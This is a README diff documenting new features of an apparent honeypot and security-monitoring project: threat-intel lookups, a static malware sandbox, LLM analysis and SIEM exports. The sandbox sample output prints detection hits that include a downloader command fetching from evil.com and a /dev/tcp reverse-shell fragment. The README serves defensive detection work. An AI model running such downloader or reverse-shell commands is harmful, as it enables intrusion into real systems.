@@ -189,6 +189,111 @@ The installer checks prerequisites, clones the repo, generates secure passwords,
 - [x] **Iteration 6** — v1.0.0: Release workflow, RPi one-click setup, console API, community governance, plugin template
 - [x] **Iteration 7** — Final: E2E testing (Playwright), performance caching, deployment matrix, security audit, v1.0 release
 - [x] **Iteration 8** — SaaS: relay backend, Stripe billing, plugin marketplace, hardware kits, launch assets
+- [x] **Iteration 9** — Intel: threat feeds (MISP/OTX/VT), malware sandbox, advanced AI (RAG), SIEM exports (ELK/Splunk/TheHive), i18n (EN/ES/DE/FR/EL)
+
+## Features (Iteration 9 — Threat Intelligence, Malware Sandbox & i18n)
+
+### Threat Intelligence Feeds
+- **Aggregated lookups** — query MISP, AlienVault OTX, AbuseIPDB, and VirusTotal from a single API
+- **In-memory TTL cache** — 1-hour cache to avoid duplicate API calls
+- **Normalized results** — unified `ThreatIntelResult` across all feed providers
+- **Feed status** — `/api/v1/threat-intel/feeds` shows which feeds are configured and active
+
+```
+ Threat Intel — Indicator Lookup
+ ──────────────────────────────────────────────────────────
+  Indicator: 185.220.101.42  │  Type: IP
+
+  ┌───────────┬───────────┬────────┬──────────────────────┐
+  │ Source    │ Malicious │ Conf.  │ Categories           │
+  ├───────────┼───────────┼────────┼──────────────────────┤
+  │ AbuseIPDB │ YES       │  92%   │ bruteforce, ssh      │
+  │ OTX       │ YES       │  85%   │ scanning, tor-exit   │
+  │ MISP      │ YES       │  78%   │ botnet, c2           │
+  │ VirusTotal│ YES       │  88%   │ malicious            │
+  └───────────┴───────────┴────────┴──────────────────────┘
+
+  Overall: MALICIOUS │ Max Confidence: 92%
+  Sources: 4/4 matched │ Cache: HIT (42s ago)
+```
+
+### Malware Sandbox (Static Analysis)
+- **Hash computation** — MD5, SHA-1, SHA-256 for every captured file
+- **Shannon entropy** — detect packed/encrypted payloads (entropy > 7.0)
+- **Magic byte detection** — ELF, PE, Gzip, PNG, shell scripts, and more
+- **Pattern matching** — 12 YARA-like rules (reverse shells, crypto miners, downloaders, persistence)
+- **IOC extraction** — URLs, IP addresses, and domains from file contents
+- **Risk scoring** — 0-100 score with clean/suspicious/malicious verdict
+- **Optional Cuckoo/CAPE** — dynamic analysis submission and result polling
+
+```
+ Malware Sandbox — Static Analysis
+ ──────────────────────────────────────────────────────────
+  File: malware.sh (2,847 bytes)
+  Type: Shell script │ MIME: text/x-shellscript
+
+  Hashes:
+    MD5:    a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
+    SHA256: 9f86d0...e4f0f5
+
+  Entropy: 4.82 / 8.0 (normal)
+
+  ┌──────────────────────────────────────────────────────┐
+  │ Matched Patterns:                                    │
+  │  ⚠ downloader   — wget http://evil.com/payload      │
+  │  ⚠ chmod_exec   — chmod 777 payload                 │
+  │  ⚠ reverse_shell — /dev/tcp/10.0.0.1/4444           │
+  │                                                      │
+  │ IOCs Found:                                          │
+  │  URLs: http://evil.com/payload                       │
+  │  IPs:  10.0.0.1                                      │
+  │  Domains: evil.com                                   │
+  └──────────────────────────────────────────────────────┘
+
+  Risk Score: 78/100 │ Verdict: MALICIOUS
+```
+
+### Advanced AI (RAG + Multi-LLM Routing)
+- **RAG context** — retrieval-augmented generation from recent captured sessions
+- **Multi-LLM routing** — task-based model selection (phi3:mini → llama3.2:3b → mistral:7b)
+- **Structured output** — threat level, summary, MITRE ATT&CK mapping, IOCs, recommendations
+- **Batch analysis** — trend detection across multiple sessions
+- **JSON parsing** — robust extraction from fenced/embedded LLM responses
+
+### Enhanced SIEM Exports
+- **Elasticsearch bulk** — `/api/v1/export/elk` NDJSON format with ECS field mapping
+- **Splunk HEC** — `/api/v1/export/splunk` HTTP Event Collector JSON format
+- **TheHive alerts** — `/api/v1/export/thehive` alert format with TLP/PAP levels and observables
+- **Plus existing** — JSON, CEF, and Syslog formats from Iteration 5
+
+### Internationalization (i18n)
+- **5 languages** — English, Spanish, German, French, Greek
+- **Language switcher** — persistent locale selection in sidebar
+- **Browser detection** — auto-detects browser language on first visit
+- **70+ translation keys** — dashboard, navigation, stats, alerts, settings, and more
+
+```
+ Language Switcher — i18n
+ ──────────────────────────────────────────────────────────
+  ┌──────────────────────────────┐
+  │  🌐 Language                 │
+  │  ┌────────────────────────┐  │
+  │  │ ● English              │  │
+  │  │ ○ Español              │  │
+  │  │ ○ Deutsch              │  │
+  │  │ ○ Français             │  │
+  │  │ ○ Ελληνικά             │  │
+  │  └────────────────────────┘  │
+  └──────────────────────────────┘
+  Locale saved to localStorage
+  Auto-detected from browser: Accept-Language
+```
+
+### v1.2.0 Release
+- 240 tests passing (51 new: threat intel 10, sandbox 17, advanced AI 20, plus 4 existing)
+- 3 new backend services, 2 new API routers, 3 new SIEM export endpoints
+- Full i18n system with 5 languages
+- CI updated with py_compile checks for all new modules
 
 ## Features (Iteration 8 — SaaS Relay, Hardware Kits & Public Launch)
 
